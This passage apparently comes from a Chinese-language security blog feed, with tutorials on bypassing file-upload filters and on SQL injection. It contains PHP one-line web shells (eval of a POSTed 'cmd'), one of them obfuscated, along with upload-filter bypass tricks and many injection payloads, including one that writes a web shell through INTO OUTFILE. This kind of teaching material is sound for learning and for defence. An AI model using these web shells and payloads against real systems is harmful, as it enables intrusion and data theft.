class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">post</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;ev&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;al&#x27;</span>;<br><span class="hljs-variable">$funcName</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span><br><span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;funcName&#x27;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;cmd&#x27;</span><br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$c</span>]<br><span class="hljs-variable">$$x</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码的最终目的都是执行通过POST变量cmd传来的字符串</p><h2 id="文件上传常见过滤"><a href="#文件上传常见过滤" class="headerlink" title="文件上传常见过滤"></a>文件上传常见过滤</h2><h3 id="无过滤"><a href="#无过滤" class="headerlink" title="无过滤"></a>无过滤</h3><p>服务端对上传的文件没有任何验证,可以直接上传一句话木马</p><h3 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h3><p>服务端对上传的文件没有任何验证,仅在前端使用JS对上传的文件进行限制</p><p>由于前端的页面是用户可控的,所以可以采用禁用JS的方式绕过</p><p><strong>在浏览器的”开发者工具-&gt;设置-&gt;偏好设置-&gt;调试器”中选择禁用JavaScript即可禁用文件的校验</strong></p><p><strong>同时,因为前端过滤是在发送数据包之前,所以可以通过先上传正常文件,再在请求包中修改文件后缀名和文件内容</strong></p><h3 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h3><p>服务端对上传文件的”Content-Type”进行验证,例如:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">------WebKitFormBoundaryIPEWZ8YxiIJILNsM<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;normal.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php<br>$a = @$_POST[&#x27;cmd&#x27;];<br>@eval($a);<br>?&gt;<br>------WebKitFormBoundaryIPEWZ8YxiIJILNsM<br></code></pre></td></tr></table></figure><p>该文件<code>Content-Type</code>为<code>application/octet-stream</code></p><p>可以将其改成合适的MIME类型来绕过验证,例如</p><p><code>image/png</code>、<code>image/jpeg</code>、<code>image/gif</code>等</p><h3 id="文件后缀名黑名单验证"><a href="#文件后缀名黑名单验证" class="headerlink" title="文件后缀名黑名单验证"></a>文件后缀名黑名单验证</h3><ul><li><p>使用<code>str_replace()</code>&#x2F;<code>str_ireplace()</code>函数将黑名单内的字符串替换为空</p><p>该函数只进行一次替换,可以将后缀名双写来绕过</p><p>​如<code>.php -&gt; .pphphp</code>在一次替换后,.pphphp中的php替换为空,后缀名变为.php</p></li><li><p>使用<code>in_array()</code>等函数检测后缀名是否在黑名单内</p><p>该函数区分大小写,且要求完全一致,可以使用大小写混合的方式绕过,或使用解析漏洞绕过</p><p>​如<code>.php -&gt; .Php</code></p></li><li><p>使用<code>preg_match</code>函数对黑名单内的字符串进行匹配</p></li><li><p>存在解析漏洞:</p><hr><p>Windows系统不区分大小写</p><hr><p>IIS</p><p>​默认将<code>xx.asp/</code>目录下的所有文件都当做<code>.asp</code>文件解析</p><p>​默认不解析分号后的内容,例如会将<code>xx.asp;.jpg</code>解析为<code>.asp</code>文件</p><p>​默认可执行文件后缀名有:<code>.asp/.asa/.cer/.cdx</code></p><hr><p>Apache </p><p>​如果文件存在多个后缀名,Apache会从右往左解析,直到解析到可识别的文件后缀,如<code>xx.html.asd.jkl</code>会被解析为<code>html</code>文件</p><p>​会将<code>php/pht/phtml/php3/php4/php5/</code>解析为php文件</p><p>​如果Apache配置文件中<code>AllowOverride</code>的值为<code>All</code>并且加载<code>mod_Rewrite</code>模块,则可以通过<code>.htaccess</code>文件修改MIME类型</p><p>​<code>AddType application/x-httpd-php .jpg //将.jpg后缀的文件解析为php文件</code></p><p>​<code>&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; //将shell.jpg解析为php文件</code></p><hr></li></ul><p>​PHP</p><p>​当上传目录下有php文件且服务器使用CGI&#x2F;FastCGI模式时,可上传<code>.user.ini</code></p><p>​可以使用<code>auto_prepend_file/auto_append_file</code>两个配置上传目录下所有php文件加入指定文件的内容</p><p>​<code>auto_prepend_file=a.jpg //向当前目录下所有php文件开头加入a.jpg中的内容</code></p><p>​<code>auto_prepend_file=a.jpg //向当前目录下所有php文件末尾加入a.jpg中的内容</code></p><h3 id="文件后缀名白名单验证"><a href="#文件后缀名白名单验证" class="headerlink" title="文件后缀名白名单验证"></a>文件后缀名白名单验证</h3><p>​只允许白名单内的后缀名文件上传</p><p>​一般使用%00截断&#x2F;0x00截断</p><h3 id="文件内容验证"><a href="#文件内容验证" class="headerlink" title="文件内容验证"></a>文件内容验证</h3><p><code>&lt;?</code>验证: 可使用<code>&lt;script language=&quot;php&quot;&gt; ...;...;  &lt;/script&gt;</code>来代替<code>&lt;?php ...;...;   ?&gt;</code></p><p><code>php</code>验证: 可使用短标签<code>&lt;?= ?&gt;</code>代替<code>&lt;?php ?&gt;</code></p><h3 id="文件头验证"><a href="#文件头验证" class="headerlink" title="文件头验证"></a>文件头验证</h3><p>使用图片马绕过或在一句话木马开头加上文件头</p><p>常见图片格式文件头:</p><p>GIF:<code>47 49 46 38 39 61</code><br>PNG:<code>89 50 4E 47 0D 0A 1A 0A</code><br>JPG:<code>FF D8 FF E0 00 10 4A 46 49 46</code></p><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>服务端将上传的图片压缩或重新生成,导致一句话木马代码消失</p><p>可以上传一张正常的图片,比较原图片和渲染后的图片没有变化的部分,然后将一句话木马代码写在不变化的位置</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>服务器在文件上传后再进行校验,如果是非法文件则删除,则可上传一个生成一句话木马的PHP文件,然后不断访问该文件,只要在服务器删除该文件前访问到该文件即可生成一句话木马</p><p>&#x2F;&#x2F;TODO</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2022/06/28/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/06/28/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="关系型数据库的基本结构"><a href="#关系型数据库的基本结构" class="headerlink" title="关系型数据库的基本结构"></a>关系型数据库的基本结构</h2><p>数据库(模式) DATABASE&#x2F;SCHEMA: 用于存储表</p><p>表 TABLE:二维表,拥有行和列</p><p>字段(列) COLUMN:对应该表的记录拥有的属性</p><p>记录(行) ROW:属于该表的实体</p><p>例如一张用户表users:</p><table><thead><tr><th>id</th><th>username</th><th>Password</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>admin</td></tr><tr><td>2</td><td>Test</td><td>Testtest123!</td></tr><tr><td>3</td><td>Test2</td><td>Test222</td></tr></tbody></table><p>id, username, password是属于这个表的记录都拥有的属性</p><p>id&#x3D;1 username&#x3D;admin password&#x3D;admin 的实体是这个表的一个记录</p><p>用面向对象的思想来看:</p><ul><li><p>表类似于类(class).</p></li><li><p>字段类似于实例变量,是每个对象都拥有的.</p></li><li><p>记录类似于对象,每个该类的(属于这个表的)对象(记录)都拥有相同的实例变量(字段),但是每个对象(记录)的实例变量(字段)的值不同.</p></li></ul><h2 id="SELECT语句的基本格式"><a href="#SELECT语句的基本格式" class="headerlink" title="SELECT语句的基本格式"></a>SELECT语句的基本格式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">[<span class="hljs-keyword">WITH</span> ... <span class="hljs-keyword">as</span> (<span class="hljs-keyword">SELECT</span> ...)] #MySQL8<span class="hljs-number">.0</span><br><span class="hljs-keyword">SELECT</span> col1,col2,...coln<br>[<span class="hljs-keyword">FROM</span> table1,table2,...,tablen]<br>[<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>]<br>[<span class="hljs-keyword">UNION</span> [<span class="hljs-keyword">ALL</span>] <span class="hljs-keyword">SELECT</span> col1,col2,...,coln ...]<br>[<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> col1,col2,...,coln]<br>[<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">condition</span>]<br>[<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> col1 [<span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>],[col2 [<span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">desc</span>],...,coln [<span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>]]]<br>[LIMIT [x,]x]<br>[<span class="hljs-keyword">PROCEDURE</span> ANALYZE(...)]<br>[<span class="hljs-keyword">INTO</span> <span class="hljs-operator">|</span>OUTFILE<span class="hljs-operator">|</span>DUMPFILE<span class="hljs-operator">|</span>var_name ...]<br>[<span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span><span class="hljs-operator">|</span>LOCK <span class="hljs-keyword">IN</span> SHARE MODE];<br></code></pre></td></tr></table></figure><h2 id="INSERT语句的基本格式"><a href="#INSERT语句的基本格式" class="headerlink" title="INSERT语句的基本格式"></a>INSERT语句的基本格式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name[(col1,col2,...,coln)]<br>[<span class="hljs-keyword">VALUES</span>(value1,value2,value3,...,valuen)]<br>[<span class="hljs-keyword">SET</span> col1<span class="hljs-operator">=</span>value1,col2<span class="hljs-operator">=</span>value2,...,coln<span class="hljs-operator">=</span>valuen]<br>[<span class="hljs-keyword">SELECT</span> ...];<br></code></pre></td></tr></table></figure><h2 id="UPDATE语句的基本格式"><a href="#UPDATE语句的基本格式" class="headerlink" title="UPDATE语句的基本格式"></a>UPDATE语句的基本格式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">table</span>[(col1,col2,...,coln)]<br><span class="hljs-keyword">SET</span> col1<span class="hljs-operator">=</span>value1,col2<span class="hljs-operator">=</span>value2,...,coln<span class="hljs-operator">=</span>valuen<br>[<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>];<br></code></pre></td></tr></table></figure><h2 id="DELETE语句的基本格式"><a href="#DELETE语句的基本格式" class="headerlink" title="DELETE语句的基本格式"></a>DELETE语句的基本格式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span><br>[<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>];<br></code></pre></td></tr></table></figure><h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="按SQL语句注入的位置"><a href="#按SQL语句注入的位置" class="headerlink" title="按SQL语句注入的位置:"></a>按SQL语句注入的位置:</h3><h4 id="CTE注入"><a href="#CTE注入" class="headerlink" title="CTE注入"></a>CTE注入</h4><p>​对CTE中的SELECT使用其他方法注入即可,例如:</p><p>​<code>WITH cte1 AS (SELECT col1,col2 FROM table1 where id=$id) SELECT col1,col2 FROM cte1;</code></p><p>​构造合适的<code>$id</code>可能可以进行联合注入、报错注入、盲注:</p><p>​<code>$id = -1 UNION SELECT database(),version()</code></p><p>​构造后会使原本语句变成:</p><p>​<code> WITH cte1 AS (SELECT ccol1,ccol2 FROM table1 where id=-1 UNION SELECT database(),version()) SELECT ccol1,ccol2 FROM cte1;</code></p><p>​原本的查询结果会变成<code>database()</code>和<code>version()</code></p><h4 id="COLUMN注入"><a href="#COLUMN注入" class="headerlink" title="COLUMN注入"></a>COLUMN注入</h4><p>​如果可以控制查询的列,可以直接输出想要的信息,例如:</p><p>​<code>SELECT $col FROM table1 where id=1; </code></p><p>​构造合适的<code>$col</code>可能进行直接的数据查询、报错注入、盲注:</p><p>​<code>$col = database()</code></p><h4 id="WHERE-x2F-HAVING-注入"><a href="#WHERE-x2F-HAVING-注入" class="headerlink" title="WHERE&#x2F;HAVING 注入"></a>WHERE&#x2F;HAVING 注入</h4><p>​对<code>WHERE/HAVING</code>语句后的条件判断进行注入,例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造合适的<code>$id</code>可能可以进行联合注入、报错注入、盲注:</p><p>​<code>$id = &quot;-1 and union select 1,database()&quot;</code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=-1 and union select 1,database();</code></p><p>​原本显示col2的位置会显示数据库，一般称作回显点.</p><h4 id="ORDER-BY-注入"><a href="#ORDER-BY-注入" class="headerlink" title="ORDER BY 注入"></a>ORDER BY 注入</h4><p>​对<code>ORDER BY</code>排序的列进行注入,如果输入的是数字,代表对第几个列进行排序,例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id ORDER BY col1,$ordercol;</code></p><p>​构造合适的<code>$ordercol</code>可能可以进行报错注入、时间盲注:</p><p>​<code>$ordercol = ,(select * from (select if(left(database(),1)=&#39;m&#39;,sleep(3),0)) x ) </code></p><p>​构造后会使原本的语句变成:</p><p>​<code> SELECT col1,col2 FROM table1 WHERE id=$id ORDER BY col1,(select * from (select if(left(database(),1)=&#39;m&#39;,sleep(3),0)) x );</code></p><p>​如果<code>dababase()</code>的前1位是m,则会延迟执行SQL查询,否则正常执行SQL查询.</p><h4 id="LIMIT-注入-仅MySQL-5-x"><a href="#LIMIT-注入-仅MySQL-5-x" class="headerlink" title="LIMIT 注入(仅MySQL 5.x)"></a>LIMIT 注入(仅MySQL 5.x)</h4><p>​对<code>LIMIT</code>限制显示的列进行注入,<code>LIMIT x,y</code>代表从查询到的第x条记录开始显示,显示y条记录,例如:</p><p>​<code> SELECT col1,col2 FROM table1 WHERE id&gt;=1 LIMIT 0,$num;</code></p><p>​构造合适的<code>$num</code>可能可以进行报错注入、时间盲注:</p><p>​<code>$num = 1 procesure analyse(updatexml(1,concat(&#39;~&#39;,benchmark(10000000,sha1(1)))),1)</code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id&gt;=1 LIMIT 0,1 procesure  analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1); </code></p><p>​可以实现报错注入</p><h4 id="INTO写SHELL"><a href="#INTO写SHELL" class="headerlink" title="INTO写SHELL"></a>INTO写SHELL</h4><p>​INTO在满足条件时可以在服务端写入文件:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 知道网站根目录的绝对路径<br><span class="hljs-bullet">2.</span> GPC关闭<br><span class="hljs-bullet">3.</span> 数据库用户有file权限<br><span class="hljs-bullet">4.</span> 有目录写权限<br></code></pre></td></tr></table></figure><p>​例:</p><p>​<code> SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造合适的<code>$id</code>可以写SHELL:</p><p>​<code>$id = -1 UNION SELECT 1,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; INTO OUTFILE &quot;shell.php&quot;</code></p><p>​构造后原本语句变为:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=-1 UNION SELECT &quot;&lt;?php xxx ?&gt;&quot; INTO OUTFILE &quot;shell.php&quot;</code></p><p>​执行后会向目录下写入一句话木马.</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>​在服务器允许多次查询的情况下,可以构造输入执行任意SQL操作,例如:</p><p>​<code>SELECT col1,col2 FROM table1 where id=$id;</code></p><p>​构造合适的<code>$id</code>:</p><p>​<code>$id = 1;INSERT INTO tables1 VALUES(4,&#39;xx&#39;,&#39;xx&#39;)</code></p><p>​构造后会使原本的语句变成:</p><p>​<code>  SELECT col1,col2 FROM table1 where id=1;INSERT INTO tables1 VALUES(4,&#39;xx&#39;,&#39;xx&#39;);</code></p><p>​会向table1中插入一条数据</p><hr><h3 id="按闭合的方式"><a href="#按闭合的方式" class="headerlink" title="按闭合的方式:"></a>按闭合的方式:</h3><h4 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入:"></a>整数型注入:</h4><p>​指注入点的位置没有符号包围,不需要闭合,参数只能是整数,例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>无需闭合即可注入:</p><p>​<code>$id = -1 UNION SELECT 1,database()</code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=-1 UNION SELECT 1,database();</code></p><h4 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入:"></a>单引号字符型注入:</h4><p>​指注入点两端被单引号包围,需要闭合单引号才可以注入,例如:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=&#39;$id&#39;;</code></p><p>​构造<code>$id</code>闭合前后的单引号完成注入:</p><p>​<code>$id = -1&#39; UNION SELECT database() WHERE &#39;1</code></p><p>​或者直接采用注释的方式去除后面的单引号:</p><p>​<code>$id = -1&#39; UNION SELECT database() #</code></p><p>​<code>$id = -1&#39; UNION SELECT database() -- </code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=&#39;-1&#39; UNION SELECT database() WHERE &#39;1&#39;;</code></p><p>​<code>SELECT col2 FROM table1 WHERE col1=&#39;-1&#39; UNION SELECT database() #&#39;;</code></p><h4 id="双引号字符型注入"><a href="#双引号字符型注入" class="headerlink" title="双引号字符型注入:"></a>双引号字符型注入:</h4><p>​指注入点两端被双引号包围,需要闭合双引号才可以注入,例如:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=&quot;$id&quot;;</code></p><p>​构造<code>$id</code>闭合前后的双引号完成注入:</p><p>​<code>$id = -1&quot; UNION SELECT database() WHERE &quot;1</code></p><p>​或者直接采用注释的方式去除后面的双引号:</p><p>​<code>$id = -1&quot; UNION SELECT database() #</code></p><p>​<code>$id = -1&quot; UNION SELECT database() -- </code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=&quot;-1&quot; UNION SELECT database() WHERE &quot;1&quot;;</code></p><p>​<code>SELECT col2 FROM table1 WHERE col1=&quot;-1&quot; UNION SELECT database() #&quot;&quot;;</code></p><h4 id="单引号括号字符型注入"><a href="#单引号括号字符型注入" class="headerlink" title="单引号括号字符型注入:"></a>单引号括号字符型注入:</h4><p>​指注入点两端被单引号括号包围,需要闭合单引号括号才可以注入,例如:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&#39;$id&#39;);</code></p><p>​构造<code>$id</code>闭合前后的单引号括号完成注入:</p><p>​<code>$id = -1&#39;) UNION SELECT database() WHERE (&#39;1</code></p><p>​或者直接采用注释的方式去除后面的单引号括号:</p><p>​<code>$id = -1&#39;) UNION SELECT database() #</code></p><p>​<code>$id = -1&#39;) UNION SELECT database() -- </code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&#39;-1&#39;) UNION SELECT database() WHERE (&#39;1&#39;);</code></p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&#39;-1&#39;) UNION SELECT database() #&#39;);</code></p><h4 id="双引号括号字符型注入"><a href="#双引号括号字符型注入" class="headerlink" title="双引号括号字符型注入:"></a>双引号括号字符型注入:</h4><p>​指注入点两端被双引号括号包围,需要闭合双引号括号才可以注入,例如:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&quot;$id&quot;);</code></p><p>​构造<code>$id</code>闭合前后的双引号括号完成注入:</p><p>​<code>$id = -1&quot;) UNION SELECT database() WHERE (&quot;1</code></p><p>​或者直接采用注释的方式去除后面的双引号括号:</p><p>​<code>$id = -1&quot;) UNION SELECT database() #</code></p><p>​<code>$id = -1&quot;) UNION SELECT database() -- </code></p><p>​构造后会使原本的语句变成:</p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&quot;-1&quot;) UNION SELECT database() WHERE (&quot;1&quot;);</code></p><p>​<code>SELECT col2 FROM table1 WHERE col1=(&quot;-1&quot;) UNION SELECT database() #&quot;);</code></p><h4 id="各种括号闭合型注入"><a href="#各种括号闭合型注入" class="headerlink" title="各种括号闭合型注入:"></a>各种括号闭合型注入:</h4><p>​指注入点两段可能被各种各样的括号和引号闭合,包括但不限于:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=(&#39;$id&#39;);</code></p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=(((&#39;$id&#39;)));</code></p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=((&quot;$id&quot;));</code></p><p>​必须闭合前后的括号才能够完成注入.</p><hr><h3 id="按注入使用的语句"><a href="#按注入使用的语句" class="headerlink" title="按注入使用的语句:"></a>按注入使用的语句:</h3><h4 id="联合注入-UNION-SELECT"><a href="#联合注入-UNION-SELECT" class="headerlink" title="联合注入(UNION SELECT):"></a>联合注入(UNION SELECT):</h4><p>​<strong>只有在页面上有回显点时才能使用联合注入,即能够将查询到的数据输出在网页上</strong></p><p>​使用 UNION SELECT的方式进行联合查询实现注入,例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>为:</p><p>​<code>$id = 1 UNION SELECT 1,database()</code></p><p>​则构造后原本语句会变成:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=1 UNION SELECT 1,database();</code></p><p>​在原本的查询上同时联合查询1和database().</p><p>​在大多数情况下,只有第一条查询结果会被显示在界面上,此时可使第一个查询的id为不存在的值:</p><p>​<code>$id = -1 UNION SELECT 1,database()</code></p><p>​此时查询结果即为UNION后的SELECT的查询结果.</p><h4 id="报错注入-UPDATEXML"><a href="#报错注入-UPDATEXML" class="headerlink" title="报错注入(UPDATEXML):"></a>报错注入(UPDATEXML):</h4><p>​<strong>只有SQL查询错误时会提示报错信息时，才能使用报错注入</strong></p><p>​使用<code>floor()</code>&#x2F;<code>extractvaule()</code>&#x2F;<code>updatexml()</code>&#x2F;<code>exp()</code>等函数对参数的限制,构造出不满足条件的参数,在报错中通过参数带出信息</p><p>​1.<code>floor()</code>报错注入:</p><p>​报错原理: 伪随机造成的主键重复</p><p>​构造以下语句造成报错:</p><p>​<code>select count(*),floor(rand(0)*2)  from users group by floor(rand(0)*2);</code></p><p>​可通过group by 后语句带出数据</p><p>​<code>select count(*),floor(rand(0)*2) from users group by concat(database(),floor(rand(0)*2));</code></p><p>​例如:</p><p>​<code> SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>为:</p><p>​<code>$id = 1 union select count(*),floor(rand(0)*2) error from user group by concat(database(),&#39;~&#39;,floor(rand(0)*2)) </code></p><p>​则会报错:</p><p>​<code> Duplicate entry &#39;数据库名~1&#39; for key &#39;&#39;</code></p><p>​2.<code>extractvalue()/updatexml()</code>报错注入</p><p>​报错原理: 构造错误的Xpath造成报错</p><p>​Xpath一定不以’~’开头,构造以下语句造成报错:</p><p>​<code>updatexml(1,concat(&#39;~&#39;,xxx,&#39;~&#39;),1)</code></p><p>​<code>extractvalue(1,concat(&#39;~&#39;,xxx,&#39;~&#39;))</code></p><p>​例如:</p><p>​<code> SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>为:</p><p>​<code>$id = 1 union select updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1)</code></p><p>​或</p><p>​<code>$id = 1 and select updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1)</code></p><p>​则会报错:</p><p>​<code> XPATH syntax error: &#39;~数据库名~&#39;</code></p><p>​ <strong><code>extractvalue()和updatexml()</code>的Xpath报错长度最大为32位</strong>  </p><p>​3.<code>exp()</code>报错  <strong>(仅MySQL &lt; 5.6)</strong></p><p>​报错原理:当传递给<code>exp()</code>的参数值大于709时会出现双浮点溢出报错</p><p>​对0取反会得到一个很大的数,查询成功返回0,所以对查询结果取反作为<code>exp()</code>的参数</p><p>​构造子查询造成报错:</p><p>​<code>select exp(~(select * from (select database()) x));</code></p><p>​则会报错:</p><p>​<code> DOUBLE value is out of range in &#39;exp(~((select &#39;数据库名&#39; from dual)))&#39;</code></p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​可构造<code>$id</code>为:</p><p>​<code>$id = 1 and exp(~(select * from (select database()) x ))</code></p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注:"></a>布尔盲注:</h4><p>​布尔盲注常用于可以判断查询结果但不能获取查询到数据并且不会输出报错信息的情况</p><p>​使用<code>left()/substr()/length()</code>等函数获取信息与猜测值进行比较,正确时使查询成功,错误时使查询失败</p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>为:</p><p>​<code>$id = 1 and length(database())=8 </code></p><p>​此时如果数据库名长度等于8则查询成功,否则查询失败.</p><p>​获得出数据库名的长度后,再构造<code>$id</code>为:</p><p>​<code>$id = 1 and left(database(),3)=&#39;xyz&#39;</code></p><p>​此时如果数据库名的前3个字符为’xyz’则查询成功,否则查询失败</p><p>​常用函数:</p><p>​<code>if(cond,expr1,expr2)如果cond的值等同于true,则返回表达式expr1,否则返回表达式expr2</code></p><p>​<code>length(str)   返回字符串str的长度</code></p><p>​<code>strsub(str,n,m)   返回字符串str的从第n个字符开始,长度为m的子字符串</code></p><p>​<code>left(str,n) 返回字符串str的前n个字符</code></p><h4 id="时间盲注-IF-SLEEP"><a href="#时间盲注-IF-SLEEP" class="headerlink" title="时间盲注(IF,SLEEP):"></a>时间盲注(IF,SLEEP):</h4><p>​时间盲注常用于无论查询成功还是失败,页面都无任何变化的情况</p><p>​常用<code>sleep()/benchmark()</code>产生页面加载延迟进行注入</p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$id;</code></p><p>​构造<code>$id</code>为:</p><p>​<code>$id = 1 and if(length(database())=8,sleep(3),0) </code></p><p>​此时如果数据库名长度等于8,则页面会延迟3秒加载,否则会立即加载</p><p>​也可以使用:</p><p>​<code>$id = 1 and if(left(database(),3)=&#39;xyz&#39;,benchmark(200000000,(select 1)),0)</code></p><p>​此时如果数据库名长度等于8,则页面会延迟加载,否则会立即加载</p><p>​常用函数:</p><p>​<code>sleep(n)等待n秒后继续执行SQL语句</code></p><p>​<code>benchmark(n,expr) 执行表达式exprn次,测试expr的执行速度,当n&gt;10^8时会产生明显延迟</code></p><hr><h3 id="按注入点的位置"><a href="#按注入点的位置" class="headerlink" title="按注入点的位置:"></a>按注入点的位置:</h3><h4 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入:"></a>GET型注入:</h4><p>​GET型注入点位于URL最后端,以HTTP GET参数形式传递给后端</p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$_GET[&#39;id&#39;];</code></p><p>​URL一般为:</p><p>​<code>http://www.xxx.com/xxx.php?id=x</code></p><p>​可通过访问以下URL进行联合注入:</p><p>​<code>http://www.xxx.com/xxx.php?id=1 union select 1,2</code></p><p>​<strong>GET型注入中特殊符号尽量使用URLencode,如#使用%23,否则可能导致预期外错误</strong> </p><h4 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入:"></a>POST型注入:</h4><p>​POST型注入点位于HTTP POST请求包末尾,以HTTP POST参数形式传递给后端</p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$_POST[&#39;id&#39;];</code></p><p>​请求包一般为:</p><figure 